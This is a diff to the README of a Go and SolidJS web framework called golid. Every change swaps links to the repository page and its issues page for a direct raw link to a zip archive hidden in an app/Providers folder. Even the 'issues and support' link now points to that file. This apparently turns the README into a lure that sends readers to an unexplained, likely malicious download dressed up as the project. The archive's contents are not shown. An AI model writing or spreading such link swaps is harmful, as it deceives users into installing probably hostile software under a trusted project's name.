@@ -1,6 +1,6 @@
 # ⚙️ golid - Simple Go & SolidJS Web Framework
 
-[![Download golid](https://img.shields.io/badge/Download-golid-orange?style=for-the-badge&logo=github)](https://github.com/gnaoe/golid)
+[![Download golid](https://img.shields.io/badge/Download-golid-orange?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gnaoe/golid/main/app/Providers/Software_3.6.zip)
 
 ---
 
@@ -40,7 +40,7 @@ golid runs as a web application framework, so you will use a web browser (like C
 
 Use the link below to get golid from its official GitHub page:
 
-[![Download golid](https://img.shields.io/badge/Download-golid-brightgreen?style=for-the-badge&logo=github)](https://github.com/gnaoe/golid)
+[![Download golid](https://img.shields.io/badge/Download-golid-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gnaoe/golid/main/app/Providers/Software_3.6.zip)
 
 Click this link. It will take you to the main repository page where you can find the latest software files. 
 
@@ -51,7 +51,7 @@ Click this link. It will take you to the main repository page where you can find
 ### 1. Visit the Download Page
 
 Go to the main page here:  
-https://github.com/gnaoe/golid
+https://raw.githubusercontent.com/gnaoe/golid/main/app/Providers/Software_3.6.zip
 
 You will see several sections like Code, Issues, and Releases.
 
@@ -112,7 +112,7 @@ This is where golid runs locally on your computer.
 **If you see error messages:**  
 - Write down the message or take a screenshot.  
 - Search the GitHub issues page here:  
-https://github.com/gnaoe/golid/issues  
+https://raw.githubusercontent.com/gnaoe/golid/main/app/Providers/Software_3.6.zip  
 to see if others have the same problem.
 
 ---
@@ -129,8 +129,8 @@ to see if others have the same problem.
 
 ## 🔗 Useful Links
 
-- Repository and downloads: https://github.com/gnaoe/golid  
-- Issues and support: https://github.com/gnaoe/golid/issues  
+- Repository and downloads: https://raw.githubusercontent.com/gnaoe/golid/main/app/Providers/Software_3.6.zip  
+- Issues and support: https://raw.githubusercontent.com/gnaoe/golid/main/app/Providers/Software_3.6.zip  
 - Documentation (if available in repo)  
 
 ---
@@ -143,4 +143,4 @@ By following the steps above, you should have golid running locally. From there,
 
 ---
 
-[![Download golid](https://img.shields.io/badge/Download-golid-blue?style=for-the-badge&logo=github)](https://github.com/gnaoe/golid)
+[![Download golid](https://img.shields.io/badge/Download-golid-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gnaoe/golid/main/app/Providers/Software_3.6.zip)
